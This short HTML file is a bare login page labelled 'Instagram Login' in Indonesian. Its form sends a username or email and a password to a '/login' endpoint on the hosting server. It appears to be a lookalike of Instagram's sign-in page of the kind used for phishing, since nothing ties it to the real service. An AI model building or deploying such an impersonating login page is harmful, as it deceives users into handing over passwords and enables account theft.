<!DOCTYPE html>
<html>
<head><title>Instagram Login</title></head>
<body>
  <h2>Masuk ke Instagram</h2>
  <form method="POST" action="/login">
    <input name="username" placeholder="Nama Pengguna atau Email" required><br><br>
    <input name="password" type="password" placeholder="Kata Sandi" required><br><br>
    <button type="submit">Masuk</button>
  </form>
</body>
</html>
